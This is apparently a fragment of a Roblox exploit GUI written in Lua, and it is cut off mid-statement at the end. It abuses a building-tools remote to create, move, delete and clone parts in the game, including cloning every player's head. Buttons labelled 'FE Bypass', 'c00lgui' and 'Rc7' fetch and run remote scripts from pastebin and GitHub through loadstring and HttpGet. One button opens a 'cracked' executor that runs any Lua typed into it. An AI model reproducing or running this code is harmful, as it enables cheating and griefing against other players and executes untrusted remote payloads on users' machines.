	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function ClonePart(part)
		local args = {
			[1] = "Clone",
			[2] = {
				[1] = part
			},
			[3] = workspace
		}

		_(args)
	end

	function clonehead(player)
		char = player.Character
		ClonePart(char.Head)
	end

	for i,v in game.Players:GetPlayers() do
		--spawn(function()
		pcall(function()
			clonehead(v)
		end)
		--end)
	end

end)

AdminCommandsGuis.Name = "Admin Commands/Guis"
AdminCommandsGuis.Parent = Page1_2
AdminCommandsGuis.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
AdminCommandsGuis.BorderColor3 = Color3.fromRGB(255, 0, 0)
AdminCommandsGuis.BorderSizePixel = 3
AdminCommandsGuis.Position = UDim2.new(0.5, 3, 0, 0)
AdminCommandsGuis.Size = UDim2.new(0.5, -3, 1, 0)
AdminCommandsGuis.ZIndex = 2

FEBypass.Name = "FE Bypass"
FEBypass.Parent = AdminCommandsGuis
FEBypass.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
FEBypass.BorderColor3 = Color3.fromRGB(255, 0, 0)
FEBypass.BorderSizePixel = 3
FEBypass.Position = UDim2.new(0, 0, 0, 33)
FEBypass.Size = UDim2.new(0.5, 0, 0, 30)
FEBypass.ZIndex = 2
FEBypass.Font = Enum.Font.SourceSans
FEBypass.Text = "FE Bypass"
FEBypass.TextColor3 = Color3.fromRGB(255, 255, 255)
FEBypass.TextSize = 14.000
FEBypass.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/FXt5qbmt"))()
end)

Title_14.Name = "Title"
Title_14.Parent = AdminCommandsGuis
Title_14.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Title_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
Title_14.BorderSizePixel = 3
Title_14.Size = UDim2.new(1, 0, 0, 30)
Title_14.ZIndex = 2
Title_14.Font = Enum.Font.SourceSansBold
Title_14.Text = "Admin Commands/Guis"
Title_14.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_14.TextSize = 14.000
Title_14.TextWrapped = true

KohlsAdmin.Name = "Kohl's Admin"
KohlsAdmin.Parent = AdminCommandsGuis
KohlsAdmin.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
KohlsAdmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
KohlsAdmin.BorderSizePixel = 3
KohlsAdmin.Position = UDim2.new(0.5, 3, 0, 33)
KohlsAdmin.Size = UDim2.new(0.5, -3, 0, 30)
KohlsAdmin.ZIndex = 2
KohlsAdmin.Font = Enum.Font.SourceSans
KohlsAdmin.Text = "c00lgui Reborn V4 (Skidded)"
KohlsAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
KohlsAdmin.TextScaled = true
KohlsAdmin.TextSize = 14.000
KohlsAdmin.TextWrapped = true
KohlsAdmin.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/Cn3NU5A9'))()
end)

BTTConsole.Name = "BTT Console"
BTTConsole.Parent = AdminCommandsGuis
BTTConsole.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
BTTConsole.BorderColor3 = Color3.fromRGB(255, 0, 0)
BTTConsole.BorderSizePixel = 3
BTTConsole.Position = UDim2.new(0, 0, 0, 66)
BTTConsole.Size = UDim2.new(0.5, 0, 0, 30)
BTTConsole.ZIndex = 2
BTTConsole.Font = Enum.Font.SourceSans
BTTConsole.Text = "Rc7"
BTTConsole.TextColor3 = Color3.fromRGB(255, 255, 255)
BTTConsole.TextSize = 14.000
BTTConsole.TextWrapped = true
BTTConsole.MouseButton1Down:connect(function()
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:
	game:GetService("StarterGui"):SetCore("SendNotification",{ 	Title = "Rc7",  	

		Text = "password: Rc7Cracked",

	})

	game:GetService("StarterGui"):SetCore("SendNotification",{ 	

		Title = "wait...",  	

		Text = "loading...",

	})

	wait(3)

	game:GetService("StarterGui"):SetCore("SendNotification",{ 	

		Title = "loaded!",  	

		Text = "Have fun!",

	})
	local rc7 = Instance.new("ScreenGui")
	local mini = Instance.new("ImageButton")
	local passpage = Instance.new("ImageLabel")
	local submit = Instance.new("TextButton")
	local user = Instance.new("TextBox")
	local pass = Instance.new("TextBox")
	local close = Instance.new("TextButton")
	local minimize = Instance.new("TextButton")
	local mainpage = Instance.new("ImageLabel")
	local input = Instance.new("TextBox")
	local output = Instance.new("TextBox")
	local exe = Instance.new("TextButton")
	local clear = Instance.new("TextButton")
	local open = Instance.new("TextButton")
	local roxploit = Instance.new("TextButton")
	local dex = Instance.new("TextButton")
	local close_2 = Instance.new("TextButton")
	local minimize_2 = Instance.new("TextButton")

	--Properties:

	rc7.Name = "rc7"
	rc7.Parent = game.CoreGui
	rc7.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	mini.Name = "mini"
	mini.Parent = rc7
	mini.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mini.BackgroundTransparency = 1.000
	mini.BorderColor3 = Color3.fromRGB(0, 0, 0)
	mini.BorderSizePixel = 0
	mini.Position = UDim2.new(0, 0, 0.894399107, 0)
	mini.Size = UDim2.new(0, 58, 0, 60)
	mini.Visible = false
	mini.Image = "http://www.roblox.com/asset/?id=14416021390"
	mini.MouseButton1Down:connect(function()
		mainpage.Visible = true
		mini.Visible = false
	end)

	passpage.Name = "passpage"
	passpage.Parent = rc7
	passpage.Active = true
	passpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	passpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
	passpage.BorderSizePixel = 0
	passpage.Position = UDim2.new(0.171028033, 0, 0.178529739, 0)
	passpage.Size = UDim2.new(0, 349, 0, 363)
	passpage.Image = "rbxassetid://13695440070"

	submit.Name = "submit"
	submit.Parent = passpage
	submit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	submit.BackgroundTransparency = 1.000
	submit.BorderColor3 = Color3.fromRGB(0, 0, 0)
	submit.BorderSizePixel = 0
	submit.Position = UDim2.new(0.343839556, 0, 0.561983466, 0)
	submit.Size = UDim2.new(0, 101, 0, 20)
	submit.Font = Enum.Font.SourceSans
	submit.Text = ""
	submit.TextColor3 = Color3.fromRGB(0, 0, 0)
	submit.TextSize = 14.000
	submit.MouseButton1Down:connect(function()
		if pass.Text == "Rc7Cracked" then
			passpage.Visible = false
			mainpage.Visible = true
		else
			pass.Text = "Wrong Password!"
			wait(2)
			pass.Text = ""
		end
	end)

	user.Name = "user"
	user.Parent = passpage
	user.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	user.BackgroundTransparency = 1.000
	user.BorderColor3 = Color3.fromRGB(0, 0, 0)
	user.BorderSizePixel = 0
	user.Position = UDim2.new(0.260744989, 0, 0.393939406, 0)
	user.Size = UDim2.new(0, 160, 0, 21)
	user.Font = Enum.Font.SourceSans
	user.Text = "username"
	user.TextColor3 = Color3.fromRGB(20, 212, 255)
	user.TextSize = 14.000
	user.TextWrapped = true

	pass.Name = "pass"
	pass.Parent = passpage
	pass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pass.BackgroundTransparency = 1.000
	pass.BorderColor3 = Color3.fromRGB(0, 0, 0)
	pass.BorderSizePixel = 0
	pass.Position = UDim2.new(0.261000007, 0, 0.479999989, 0)
	pass.Size = UDim2.new(0, 160, 0, 21)
	pass.Font = Enum.Font.SourceSans
	pass.Text = ""
	pass.TextColor3 = Color3.fromRGB(20, 212, 255)
	pass.TextSize = 14.000
	pass.TextWrapped = true

	close.Name = "close"
	close.Parent = passpage
	close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	close.BackgroundTransparency = 1.000
	close.BorderColor3 = Color3.fromRGB(0, 0, 0)
	close.BorderSizePixel = 0
	close.Position = UDim2.new(0.88252151, 0, 0, 0)
	close.Size = UDim2.new(0, 41, 0, 24)
	close.Font = Enum.Font.SourceSans
	close.Text = ""
	close.TextColor3 = Color3.fromRGB(0, 0, 0)
	close.TextSize = 14.000
	close.MouseButton1Down:connect(function()
		passpage.Visible = false
	end)

	minimize.Name = "minimize"
	minimize.Parent = passpage
	minimize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	minimize.BackgroundTransparency = 1.000
	minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
	minimize.BorderSizePixel = 0
	minimize.Position = UDim2.new(0.598853886, 0, 0, 0)
	minimize.Size = UDim2.new(0, 41, 0, 24)
	minimize.Font = Enum.Font.SourceSans
	minimize.Text = ""
	minimize.TextColor3 = Color3.fromRGB(0, 0, 0)
	minimize.TextSize = 14.000

	mainpage.Name = "mainpage"
	mainpage.Parent = rc7
	mainpage.Active = true
	mainpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mainpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
	mainpage.BorderSizePixel = 0
	mainpage.Position = UDim2.new(0.171028033, 0, 0.178529739, 0)
	mainpage.Size = UDim2.new(0, 349, 0, 363)
	mainpage.Visible = false
	mainpage.Image = "http://www.roblox.com/asset/?id=128681323011046"

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Name = "scrollingFrame"
	scrollingFrame.Parent = mainpage
	scrollingFrame.BackgroundTransparency = 1
	scrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Position = UDim2.new(0.034, 0, 0.2, 0)
	scrollingFrame.Size = UDim2.new(0, 296, 0, 200)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.ScrollBarImageTransparency = 1
	scrollingFrame.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	local input = Instance.new("TextBox")
	input.Name = "input"
	input.Parent = scrollingFrame
	input.BackgroundTransparency = 1
	input.BorderColor3 = Color3.fromRGB(0, 0, 0)
	input.BorderSizePixel = 0
	input.Size = UDim2.new(1, 0, 0, 200)
	input.Position = UDim2.new(0, 0, 0, 5)
	input.Font = Enum.Font.Code
	input.MultiLine = true
	input.Text = " "
	input.TextColor3 = Color3.fromRGB(0, 0, 0)
	input.TextSize = 14
	input.TextWrapped = false
	input.TextXAlignment = Enum.TextXAlignment.Left
	input.TextYAlignment = Enum.TextYAlignment.Top
	input.ClearTextOnFocus = false
	input.ClipsDescendants = false

	local padding = Instance.new("UIPadding")
	padding.Parent = input
	padding.PaddingTop = UDim.new(0, 10)
	padding.PaddingLeft = UDim.new(0, 5)

	local function updateCanvasSize()
		local textSize = input.TextBounds
		input.Size = UDim2.new(1, 0, 0, math.max(textSize.Y, 200))
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, input.Size.Y.Offset)
	end

	input:GetPropertyChangedSignal("Text"):Connect(updateCanvasSize)
	input.Focused:Connect(updateCanvasSize)
	input.FocusLost:Connect(updateCanvasSize)


	exe.Name = "exe"
	exe.Parent = mainpage
	exe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	exe.BackgroundTransparency = 1
	exe.BorderColor3 = Color3.fromRGB(0, 0, 0)
	exe.BorderSizePixel = 0
	exe.Position = UDim2.new(0.315186232, 0, 0.774104655, 0)
	exe.Size = UDim2.new(0, 99, 0, 20)
	exe.Font = Enum.Font.ArialBold
	exe.Text = "Execute"
	exe.TextColor3 = Color3.fromRGB(50, 110, 160)
	exe.TextSize = 14.000
	exe.TextTransparency = 1

	output.Name = "output"
	output.Parent = mainpage
	output.Active = false
	output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	output.BorderColor3 = Color3.fromRGB(0, 0, 0)
	output.BackgroundTransparency = 1
	output.BorderSizePixel = 0
	output.Position = UDim2.new(0.0343839526, 0, 0.845730007, 0)
	output.Size = UDim2.new(0, 296, 0, 52)
	output.Font = Enum.Font.Code
	output.Text = ""
	output.TextColor3 = Color3.fromRGB(0, 0, 0)
	output.TextSize = 14.000
	output.TextWrapped = true
	output.TextXAlignment = Enum.TextXAlignment.Left
	output.TextYAlignment = Enum.TextYAlignment.Top

	exe.MouseButton1Down:connect(function()
		output.Text = ""

		local success, result = pcall(function()
			loadstring(input.Text)()
		end)

		if success then
			output.Text = "Script successfully executed!"
			output.TextColor3 = Color3.fromRGB(0, 0, 0)
			wait(2)
			output.Text = " "
		else
			output.Text = "Error: " .. result
			output.TextColor3 = Color3.fromRGB(255, 0, 0)
			warn("Error occurred during execution: " .. result)
			wait(5)
			output.Text = " "
		end
	end)

	clear.Name = "clear"
	clear.Parent = mainpage
	clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	clear.BackgroundTransparency = 1
	clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
	clear.BorderSizePixel = 0
	clear.Position = UDim2.new(0.598853886, 0, 0.774104655, 0)
	clear.Size = UDim2.new(0, 99, 0, 20)
	clear.Font = Enum.Font.ArialBold
	clear.Text = "Clear"
	clear.TextColor3 = Color3.fromRGB(50, 110, 160)
	clear.TextSize = 14.000
	clear.TextTransparency = 1  -- Make the text transparent
	clear.MouseButton1Down:connect(function()
		input.Text = " "
	end)

	open.Name = "open"
	open.Parent = mainpage
	open.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	open.BackgroundTransparency = 1
	open.BorderColor3 = Color3.fromRGB(0, 0, 0)
	open.BorderSizePixel = 0
	open.Position = UDim2.new(0.0343839526, 0, 0.774104655, 0)
	open.Size = UDim2.new(0, 99, 0, 20)
	open.Font = Enum.Font.ArialBold
	open.Text = "Open"
	open.TextColor3 = Color3.fromRGB(50, 110, 160)
	open.TextSize = 14.000
	open.TextTransparency = 1
	open.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/ScriptHub"))()
	end)

	roxploit.Name = "roxploit"
	roxploit.Parent = mainpage
	roxploit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	roxploit.BackgroundTransparency = 1.000
	roxploit.BorderColor3 = Color3.fromRGB(0, 0, 0)
	roxploit.BorderSizePixel = 0
	roxploit.Position = UDim2.new(0.904999971, 0, 0.799000025, 0)
	roxploit.Size = UDim2.new(0, 29, 0, 29)
	roxploit.Font = Enum.Font.SourceSans
	roxploit.Text = ""
	roxploit.TextColor3 = Color3.fromRGB(0, 0, 0)
	roxploit.TextSize = 14.000
	roxploit.MouseButton1Down:connect(function()
		Folder = game.Players.LocalPlayer.PlayerGui
		script=Instance.new('LocalScript')

		local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z 
		local A,B,C,D,F,E,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z 
		local Aa,Ba,Ca,Da,Fa,Ea,Ga,Ha,Ia,Ja,Ka,La,Ma,Na,Oa,Pa,Qa,Ra,Sa,Ta,Ua,Va,Wa,Xa,Ya,Za 
		local IntroSFX = nil 
		local IntroDone,Toggle,taco = false 
		local Folders, Selected, Banned, WayPoint = nil 
		local CId = Instance.new("IntValue") CId.Value = 0 
		local LPCId = Instance.new("IntValue") LPCId.Value = 0 
		local SId = Instance.new("IntValue") 
		SId.Value = 0 
		local MId = Instance.new("IntValue") 
		MId.Value = 0 
		local MPId = Instance.new("IntValue") 
		MPId.Value = 0 
		local GId = Instance.new("IntValue") 
		GId.Value = 0 
		local GPId = Instance.new("IntValue") 
		GPId.Value = 0 
		local HId = Instance.new("IntValue") 
		HId.Value = 0 
		local HPId = Instance.new("IntValue") 
		HPId.Value = 0 
		local SDId = Instance.new("IntValue") 
		SDId.Value = 0 
		local WId = Instance.new("IntValue") WId.Value = 0 local WMId = Instance.new("IntValue") WMId.Value = 0 local LCId = Instance.new("IntValue") LCId.Value = 0 local TCId = Instance.new("IntValue") TCId.Value = 0 local MEId = Instance.new("IntValue") MEId.Value = 1 local MEPId = Instance.new("IntValue") MEPId.Value = 0 local SkyId = Instance.new("IntValue") SkyId.Value = 1 local SkypId = Instance.new("IntValue") SkypId.Value = 0 local TabId = Instance.new("IntValue") TabId.Value = 0 
		local EmptySP = UDim2.new(0,0,0,0) 
		local PrivateServer = false 

		function Execute(f) return coroutine.resume(coroutine.create(function()f()end)) end 
		function PlaySFX(SoundId,Volume,Pitch,Looped) 
			A=Instance.new("Sound",workspace) 
			A.PlayOnRemove = true 
			A.SoundId = "rbxassetid://" .. SoundId 
			A.Volume = Volume 
			A.Pitch = Pitch 
			A.Looped = Looped 
			A:Play() 
			return A 
		end 
		function Frame(parent,Size,Position) 
			B=Instance.new("Frame",parent)
			B.Size = Size 
			B.Position = Position 
			return B 
		end 
		function ScrollFrame(parent,Size,Position) B=Instance.new("ScrollingFrame",parent) B.Size = Size B.Position = Position B.ScrollBarThickness = 10 return B end 
		function Label(parent,Text,Size,Position,value) C=Instance.new("TextLabel",parent) C.Size = Size C.Position = Position C.Text = Text C.BackgroundTransparency = 1 C.Font = "Legacy" C.TextColor3 = Color3.new(1,1,1) C.TextStrokeTransparency = 0.5 C.TextWrapped = true if value ~= nil then if value == 1 then C.Size = UDim2.new(1,-10,0,35) end C.Position = UDim2.new(0,0,0,35*value.Value) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 value.Value = value.Value + 1 end return C end 
		function Button(parent,Text,Size,Position,func,value) C=Instance.new("TextButton",parent) C.Size = Size C.Position = Position C.Text = Text C.Style = "RobloxButton" C.Font = "Legacy" C.TextColor3 = Color3.new(1,1,1) C.TextStrokeTransparency = 0.5 C.TextWrapped = true C.MouseButton1Click:connect(function() ypcall(function() PlaySFX(156785206,0.75,1.25); func() end) end) if value ~= nil then if Size == EmptySP then C.Size = UDim2.new(1,-10,0,35) end C.Position = UDim2.new(0,0,0,35*value.Value) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 value.Value = value.Value + 1 end return C end 
		function TextBox(parent,text,Size,Position) C = Instance.new("TextBox") C.Parent = parent C.Name = text C.Text = text if text == "ValueBox" then C.Text = "0" end C.Size = Size C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 C.Position = Position C.TextColor3 = Color3.new(1,1,1) C.TextStrokeTransparency = 0.5 C.Font = 2 C.FontSize = Enum.FontSize.Size12 C.TextWrapped = true return C end letters = { "a"; "b"; "c"; "d"; "e"; "f"; "g"; "h"; "i"; "j"; "k"; "l"; "m"; "n"; "o"; "p"; "q"; "r"; "s"; "t"; "u"; "v"; "w"; "x"; "y" ;"z"; " "; ":"; "/" } 
		function CheckForNumbers(textbox) 
			for i = 1, #letters do 
				n = string.find(string.lower(textbox.Text), letters[i]) 
				if n ~= nil then 
					textbox.Text = string.sub(string.lower(textbox.Text), 1, n-1)..string.sub(string.lower(textbox.Text), n+1) 
				end 
			end 
		end 
		function NumTextBox(textbox) ypcall(function() Execute(function() wait(0.25) textbox.Changed:connect(function(property) if property == "Text" then CheckForNumbers(textbox) end end) end) end) end 
		function TextUsedButton(parents,name,func,value,type) x=Frame(parents,UDim2.new(1,-10,0,35),UDim2.new(0,0,0,(35*value.Value))) x.BackgroundColor3 = Color3.new(0,75/255,150/255) x.BackgroundTransparency = 0.85 x.BorderSizePixel = 0 y=TextBox(x,"ValueBox",UDim2.new(1,-85,0,25),UDim2.new(0,5,0,5)) y.BackgroundColor3 = Color3.new(0,75/255,150/255) y.BackgroundTransparency = 0.85 y.BorderSizePixel = 0 if type ~= nil then NumTextBox(y) y.Text = type else y.Text = "" end z=Button(x,name,UDim2.new(0,70,0,25),UDim2.new(1,-75,0,5),function() if y.Text ~= "" and type ~= nil then func() else func() end end) z.BackgroundColor3 = Color3.new(0,75/255,150/255) z.BackgroundTransparency = 0.85 z.BorderSizePixel = 0 z.Style = "Custom" if value ~= nil then value.Value = value.Value + 1 end return x end 
		function TextUsedLabel(parents,name,value,type) x=Frame(parents,UDim2.new(1,-10,0,35),UDim2.new(0,0,0,(35*value.Value))) x.BackgroundColor3 = Color3.new(0,75/255,150/255) x.BackgroundTransparency = 0.85 x.BorderSizePixel = 0 y=TextBox(x,"ValueBox",UDim2.new(1,-85,0,25),UDim2.new(0,80,0,5)) y.BackgroundColor3 = Color3.new(0,75/255,150/255) y.BackgroundTransparency = 0.85 y.BorderSizePixel = 0 if type ~= nil then NumTextBox(y) y.Text = type else y.Text = "" end z=Label(x,name,UDim2.new(0,70,0,25),UDim2.new(0,5,0,5)) z.BackgroundColor3 = Color3.new(0,75/255,150/255) z.BackgroundTransparency = 0.85 z.BorderSizePixel = 0 if value ~= nil then value.Value = value.Value + 1 end return x end 
		function ToggleButton(parent,name,func1,func2,value) x=Frame(parent,UDim2.new(1,-10,0,35),UDim2.new(0,0,0,35*value.Value)) x.BackgroundColor3 = Color3.new(0,75/255,150/255) x.BackgroundTransparency = 0.85 z=Label(x,name,UDim2.new(1,-160,0,25),UDim2.new(0,5,0,5)) z.BackgroundColor3 = Color3.new(0,75/255,150/255) z.BackgroundTransparency = 0.85 y=Button(x,"On",UDim2.new(0,-70,0,25),UDim2.new(1,-80,0,5),function() func1() end) y.BackgroundTransparency = 0.85 y.BackgroundColor3 = Color3.new(0,75/255,150/255) y.Style = "Custom" y.Name = "On" g=Button(x,"Off",UDim2.new(0,-70,0,25),UDim2.new(1,-5,0,5),function() func2() end) g.BackgroundTransparency = 0.85 g.BackgroundColor3 = Color3.new(0,75/255,150/255) g.Style = "Custom" g.Name = "Off" if value ~= nil then value.Value = value.Value + 1 end return x end 
		function ImageLabel(parent,Image,Size,Position) C = nil C=Instance.new("ImageLabel",parent) C.Image = "rbxassetid://" .. Image C.Size = Size C.Position = Position C.BackgroundTransparency = 1 return C end 
		function ToggleMenu() if Toggle == true then PlaySFX(243152215,0.85,1) E:TweenPosition(UDim2.new(0.5,-250,-0.5,-175),"Out","Quad",.5,true) PlaySFX(145487017,0.85,1.1) L:TweenPosition(UDim2.new(0,0,1,-50),"Out","Quad",.25,true) Toggle = false else PlaySFX(243152215,0.85,1) E:TweenPosition(UDim2.new(0.5,-250,0.5,-175),"Out","Quad",.5,true) PlaySFX(145487017,0.85,1.1) L:TweenPosition(UDim2.new(0,-50,1,-50),"Out","Quad",.25,true) Toggle = true end end 
		function AddTab(parent,tabparent,text,cValue) if cValue ~= nil then D=Frame(tabparent,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0)) D.Transparency = 1 D.BorderSizePixel = 0 D.Name = text D.Visible = false if cValue.Value == 0 then D.Visible = true end Instance.new("IntValue",D).Name = "IsATab" C=Button(parent,text,UDim2.new(1,-10,0,35),UDim2.new(0,5,0,5+(40*cValue.Value)),function() for i, v in pairs(tabparent:GetChildren()) do if v.Name == text then v.Visible = true else v.Visible = false end end end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 Instance.new("IntValue",C).Name = "IsATabButton" if cValue ~= nil then cValue.Value = cValue.Value + 1 end if parent.Parent.ClassName == "ScrollingFrame" then parent.Parent.CanvasSize = UDim2.new(0,0,0,5+(40*(cValue.Value))) end return D end end 
		function ClearFolder(Folder) if Folder ~= nil then for i,v in pairs(Folder:GetChildren()) do v:Remove() end end end 
		function CreateFolder(parent,name) 
			C=Instance.new("Folder",parent) 
			C.Name = name 
			return C 
		end 
		function AddValue(Folder,name) 
			if Folder ~= nil then 
				C=Instance.new("StringValue")
				C.Name = name 
				C.Value = name 
				C.Parent = 
					Folder 
			end 
		end 
		function RemoveValue(Folder,name) 
			if Folder ~= nil then 
				if Folder:FindFirstChild(name) ~= nil then 
					Folder:FindFirstChild(name):Remove() 
				end 
			end 
		end 
		function VerifyValue(Folder,name) 
			if Folder ~= nil then 
				if Folder:FindFirstChild(name) ~= nil then 
					return true 
				else 
					return false 
				end 
			end 
		end 
		local Mouse 
		function AddHotkey(key,func) Mouse = game.Players.LocalPlayer:GetMouse() if Mouse ~= nil then Mouse.KeyDown:connect(function(Key) if Key == string.lower(string.char(key)) then func() end end) else Mouse = game.Players.LocalPlayer:GetMouse() end end local STR = " : False" 
		function SetPlayerList(parent) ClearFolder(parent) ypcall(function() for i,v in pairs(game.Players:GetChildren()) do if VerifyValue(Selected,v.Name) then STR = " : True" else STR = " : False" end C=Button(parent,v.Name .. STR,UDim2.new(1,-20,0,35),UDim2.new(0,5,0,5+(40*(i-1))),function() if VerifyValue(Selected,v.Name) then RemoveValue(Selected,v.Name) else AddValue(Selected,v.Name) end SetPlayerList(parent) end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 if parent.ClassName == "ScrollingFrame" then parent.CanvasSize = UDim2.new(0,0,0,5+(40*(i))) end end end) end 
		function SetBannedList(parent) ClearFolder(parent) for i,v in pairs(Banned:GetChildren()) do C=Button(parent,v.Name,UDim2.new(1,-20,0,35),UDim2.new(0,5,0,5+(40*(i-1))),function() if VerifyValue(Banned,v.Name) then RemoveValue(Banned,v.Name) end end) C.Style = "Custom" C.BackgroundColor3 = Color3.new(0,75/255,150/255) C.BackgroundTransparency = 0.85 C.BorderSizePixel = 0 if parent.ClassName == "ScrollingFrame" then parent.CanvasSize = UDim2.new(0,0,0,5+(40*(i))) end end end function IsLocalPlayer(aname) if game.Players ~= nil then if game.Players.LocalPlayer ~= nil then if game.Players.LocalPlayer.Name == aname then return true else return false end end end end local ContentProvider = game:GetService("ContentProvider"); local function LoadAssets(AssetList) for _, AssetId in pairs(AssetList) do ContentProvider:Preload("rbxassetid://" .. AssetId); end end LoadAssets({364328150,278201073,145487017,278208523,278208523}) local PRT = Instance.new("ScreenGui",Folder) Label(PRT,"Currently Preloading Data, Please Wait!",UDim2.new(1,0,0,20),UDim2.new(0,0,0,0)) while (ContentProvider.RequestQueueSize > 0) do wait(); end if Folder:FindFirstChild("GlobalData") ~= nil then for i,v in pairs(Folder:FindFirstChild("GlobalData"):GetChildren()) do v.Parent = Folder end Folder:FindFirstChild("GlobalData"):Remove() end for i,v in pairs(Folder:GetChildren()) do if v.Name == "GearData" or v.Name == "HatData" or v.Name == "MemeData" or v.Name == "SkyData" then for k,c in pairs(v:GetChildren()) do LoadAssets({c.Value}) end end end PRT:Remove() function spamColor(v) if v.ClassName == ("BasePart") then v.BrickColor = BrickColor.Random() else for a,b in pairs(v:GetChildren()) do spamColor(b) end end end function UnAnchore(v) if v.ClassName == ("BasePart") then v.Anchored = false else for a,b in pairs(v:GetChildren()) do if game.Players:FindFirstChild(v.Name) == nil then UnAnchore(b) end end end end function Anchore(v) if v.ClassName == ("BasePart") then v.Anchored = true else for a,b in pairs(v:GetChildren()) do if game.Players:FindFirstChild(v.Name) == nil then Anchore(b) end end end end function clearW(v) v:ClearAllChildren() end function GenerateMenuPart2() local Color = Color3.new(0,75/255,150/255) X=AddTab(M,N,"Hat Giver",TabId) X.Size = UDim2.new(1,10,1,0) T=AddTab(M,N,"Music Player",TabId) T.Size = UDim2.new(1,10,1,0) local MPitch=TextUsedLabel(T,"Pitch",MId,1) local MVolume=TextUsedLabel(T,"Volume",MId,1) local 